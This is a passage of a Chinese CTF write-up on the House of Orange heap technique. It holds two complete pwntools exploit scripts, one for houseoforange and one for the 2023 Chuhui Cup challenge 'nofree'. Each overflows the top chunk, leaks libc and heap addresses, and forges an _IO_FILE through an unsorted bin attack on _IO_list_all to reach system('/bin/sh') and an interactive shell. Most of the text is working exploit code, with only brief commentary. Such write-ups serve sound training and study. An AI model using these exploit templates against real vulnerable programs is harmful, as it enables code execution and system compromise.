​
申请新堆块来触发攻击
    p.sendlineafter('Your choice : ',str(1))
‍
##### 完整exp：
    #encoding = utf-8
    from pwn import *
    from pwnlib.rop import *
    from pwnlib.context import *
    from pwnlib.fmtstr import *
    from pwnlib.util.packing import *
    from pwnlib.gdb import *
    from ctypes import *
    import os
    import sys
    import time
    import base64
    #from ae64 import AE64
    #from LibcSearcher import * 
    context.os = 'linux'
    context.arch = 'amd64'
    #context.arch = 'i386'
    context.log_level = "debug"
    name = './pwn'
    debug = 0
    if debug:
        p = remote('172.52.16.218',9999)
    else:
        p = process(name)
    libcso = '/lib/x86_64-linux-gnu/libc-2.23.so'
    #libcso = './libc-2.32.so'
    libc = ELF(libcso)
    #libc = elf.libc
    elf = ELF(name)
    s       = lambda data               :p.send(data)
    sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
    sl      = lambda data               :p.sendline(data)
    sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
    r       = lambda num                :p.recv(num)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    itr     = lambda                    :p.interactive()
    uu32    = lambda data,num           :u32(p.recvuntil(data)[-num:].ljust(4,b'\x00'))
    uu64    = lambda data,num           :u64(p.recvuntil(data)[-num:].ljust(8,b'\x00'))
    leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
    l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
    l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
    context.terminal = ['gnome-terminal','-x','sh','-c']
    def dbg():
       gdb.attach(proc.pidof(p)[0])
       pause()
    bss = elf.bss()
    def add(size,content):
        p.sendlineafter('Your choice : ',str(1))
        p.sendlineafter('Length of name :',str(size))
        p.sendafter('Name :',content)
        p.sendlineafter('Price of Orange:',str(1))
        p.sendlineafter('Color of Orange:',str(2))
    def edit(size,content):
        p.sendlineafter('Your choice : ',str(3))
        p.sendlineafter('Length of name :',str(size))
        p.sendafter('Name:',content)
        p.sendlineafter('Price of Orange:',str(1))
        p.sendlineafter('Color of Orange:',str(2))
    def delete(index):
        p.sendlineafter('4.show\n',str(2))
        p.sendlineafter('index:\n',str(index))
    def show():
        p.sendlineafter('Your choice : ',str(2))
    add(0x10,'a')
    pl=p64(0)*3+p64(0x21)+p64(0)*3+p64(0xfa1)
    edit(0x40,pl)
    add(0x1000,'b')
    add(0x400,'c'*8)
    show()
    libc_base=l64()-0x3c5188
    print('libc_base = '+hex(libc_base))
    sys = libc_base + libc.sym['system'] 
    io_list_all = libc_base + libc.sym['_IO_list_all'] 
    edit(0x20,'d'*0x10)
    show()
    heap_base=u64(p.recvuntil("\x55")[-6:].ljust(8,b"\x00"))-0xc0
    print('heap_base = '+hex(heap_base))
    pl='f'*0x400
    pl+=p64(0)+p64(0x21)
    pl+=p64(sys)+p64(0)
    pl+='/bin/sh\x00'+p64(0x61) ##&heap_base+0x4F0
    pl+=p64(0)+p64(io_list_all-0x10)
    pl+=p64(0)+p64(1)
    pl+=p64(0)*7
    pl+=p64(heap_base+0x4F0)
    pl+=p64(0)*13
    pl+=p64(heap_base+0x5c8)
    pl+=p64(0)*2+p64(sys)
    edit(0x1000,pl)
    #dbg()
    p.sendlineafter('Your choice : ',str(1))
    itr()
​  
​
‍
‍
‍
#### 2023第七届“楚慧杯”网络空间安全实践能力竞赛 nofree
‍
​  
​
**edit:**
​  
和前一个题利用点一样，也是存在一个堆溢出的漏洞
​  
​
所给的libc版本也是2.23，直接放ubuntu16里打即可
和前一个题一样的攻击思路
‍
##### exp：
    add_idx = 1
    edit_idx = 2
    show_idx = 3
    def choice(cho):
        sla('t >> ',cho)
    def add(idx,size):
        choice(add_idx)
        p.sendlineafter('input idx: ',str(idx))
        p.sendlineafter('input size: ',str(size))
    def edit(idx,size,content):
        choice(edit_idx)
        p.sendlineafter('input idx: ',str(idx))
        p.sendlineafter('input size: ',str(size))
        p.sendafter('input content: ',content)
    def show(idx):
        choice(show_idx)
        p.sendlineafter('input idx: ',str(idx))
    add(0,0x10)
    add(1,0x10)
    pl=p64(0)*3+p64(0x21)+p64(0)*3+p64(0xFC1)
    edit(0,0x40,pl)
    add(2,0x1000)
    add(3,0x400)
    show(3)
    libc_base=l64()-0x3c5188
    print('libc_base = '+hex(libc_base))
    edit(3,0x20,'a'*0x10)
    show(3)
    heap_base=u64(p.recvuntil("\x55")[-6:].ljust(8,b"\x00"))-0x40
    print('heap_base = '+hex(heap_base))
    IO_list_all=libc_base + libc.sym['_IO_list_all'] 
    sys = libc_base + libc.sym['system'] 
    pl='b'*0x400
    pl+='/bin/sh\x00'+p64(0x61)
    pl+=p64(0)+p64(IO_list_all-0x10)
    pl+=p64(0)+p64(1)
    pl+=p64(0)*7
    pl+=p64(heap_base+0x450)
    pl+=p64(0)*13
    pl+=p64(heap_base+0x450+0xD8)
    pl+=p64(0)*2+p64(sys)
    edit(3,0x1000,pl)
    choice(add_idx)
    p.sendlineafter('input idx: ','4')
    p.sendlineafter('input size: ','1280')
    itr()
‍
​​  
​​
#### 参考：
[House of Orange - CTF Wiki (ctf-wiki.org)](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-orange/)
[关于house of orange(unsorted bin attack &&FSOP)的学习总结 - ZikH26 - 博客园
(cnblogs.com)](https://www.cnblogs.com/ZIKH26/articles/16712469.html)
[houseoforange_hitcon_2016 - LynneHuan - 博客园
(cnblogs.com)](https://www.cnblogs.com/LynneHuan/p/14696780.html#houseoforange_hitcon_2016)